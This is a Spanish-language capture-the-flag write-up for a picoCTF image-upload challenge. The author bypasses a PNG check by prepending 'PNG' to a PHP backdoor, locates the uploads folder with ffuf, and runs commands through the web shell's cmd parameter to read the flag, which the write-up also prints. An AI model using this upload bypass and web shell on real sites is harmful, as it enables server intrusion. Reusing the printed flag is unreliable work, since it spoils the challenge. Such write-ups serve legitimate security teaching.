## Objetivo
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.

## Solución
- En la terminal podemos utilizar los siguiente comando para saber que herramientas esta utilizando la pagina web.
```bash
┌──(armando㉿kali)-[~]
└─$ whatweb http://atlas.picoctf.net:60150/
http://atlas.picoctf.net:60150/ [200 OK] Apache[2.4.56], Country[UNITED STATES][US], HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[18.217.83.136], PHP[8.0.30], Title[File Upload Page], X-Powered-By[PHP/8.0.30]

┌──(armando㉿kali)-[~]
└─$ curl -I http://atlas.picoctf.net:60150/
HTTP/1.1 200 OK
Date: Mon, 30 Sep 2024 22:09:01 GMT
Server: Apache/2.4.56 (Debian)
X-Powered-By: PHP/8.0.30
Content-Type: text/html; charset=UTF-8
  
┌──(armando㉿kali)-[~]
└─$ 
```
- Una vez que ya descubrimos que utiliza php utilizamos un webshell para que una vez que lo enviemos a la pagina web comprobemos que podemos enviar código cuando hay una validación de archivos png (Se le añadió PNG como primera línea de código ya que la pagina lee el binario del archivo).
- Ahora utilizaremos 2 herramientas una será una lista de palabras de `wordlist` y la otra será `ffuf` para que podamos encontrar la ubicación de donde almacena nuestra imagen la pagina web.
```bash
┌──(armando㉿kali)-[~]
└─$ mkdir picoCTFretos

┌──(armando㉿kali)-[~]
└─$ cd picoCTFretos

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ locate webshells/php
/usr/share/webshells/php
/usr/share/webshells/php/findsocket
/usr/share/webshells/php/php-backdoor.php
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/qsd-php-backdoor.php
/usr/share/webshells/php/simple-backdoor.php
/usr/share/webshells/php/findsocket/findsock.c
/usr/share/webshells/php/findsocket/php-findsock-shell.php

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ cp /usr/share/webshells/php/simple-backdoor.php webshell.php

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ nano webshell.php

Se le añade PNG al principio del archivo

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ mv webshell.php webshell.png.php

┌──(armando㉿kali)-[~/picoCTFretos]
└─$ ffuf -u http://atlas.picoctf.net:5074/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -ic

┌──(armando㉿kali)-[~]
└─$ 
```
- Una vez que encontramos en donde se encuentra almacenada nuestro archivo lo llamamos desde la dirección url modificando el parametro `cmd` para que de esta forma funcione como si estuviéramos ejecutando comandos desde la terminal y así buscamos la bandera y la mostramos.
```bash
http://atlas.picoctf.net:50724/uploads/webshell.png.php?cmd=ls
http://atlas.picoctf.net:50724/uploads/webshell.png.php?cmd=find%20/%20-name%20*txt%202%3E/dev/null
http://atlas.picoctf.net:50724/uploads/webshell.png.php?cmd=cat%20/var/www/html/MFRDAZLDMUYDG.txt
/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03} */
```

## Notas Adicionales
## Referencias
